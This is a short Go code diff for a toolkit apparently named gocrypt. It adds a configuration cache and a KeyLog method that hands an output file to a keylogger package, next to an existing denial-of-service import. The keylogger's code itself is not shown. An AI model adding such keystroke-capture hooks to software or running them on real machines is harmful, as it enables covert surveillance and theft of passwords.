@@ -11,11 +11,13 @@ import (
 	"github.com/autom8ter/gocrypt/dos"
 	"github.com/autom8ter/gocrypt/encrypt"
 	"github.com/autom8ter/gocrypt/fs"
+	"github.com/autom8ter/gocrypt/keylogger"
 	"github.com/autom8ter/gocrypt/keys"
 	"github.com/autom8ter/gocrypt/passwords"
 	"github.com/autom8ter/gocrypt/utils"
 	"github.com/howeyc/gopass"
 	"github.com/spf13/afero"
+	"github.com/spf13/viper"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -23,10 +25,20 @@ import (
 	"text/template"
 )
 
-type GoCrypt struct{}
+type GoCrypt struct {
+	cache *viper.Viper
+}
 
 func NewGoCrypt() *GoCrypt {
-	return &GoCrypt{}
+	c := viper.Sub("gocrypt")
+	c.SetFs(fs.FS())
+	return &GoCrypt{
+		cache: c,
+	}
+}
+
+func (g *GoCrypt) Cache() *viper.Viper {
+	return g.cache
 }
 
 // PrettyJson encodes an item into a pretty (indented) JSON string
@@ -212,4 +224,8 @@ func (g *GoCrypt) RemoveAllFiles(path string) error {
 
 func (g *GoCrypt) Walk(path string, walkFunc filepath.WalkFunc) error {
 	return filepath.Walk(path, walkFunc)
+}
+
+func (g *GoCrypt) KeyLog(output afero.File) {
+	keylogger.LogKeys(output)
 }
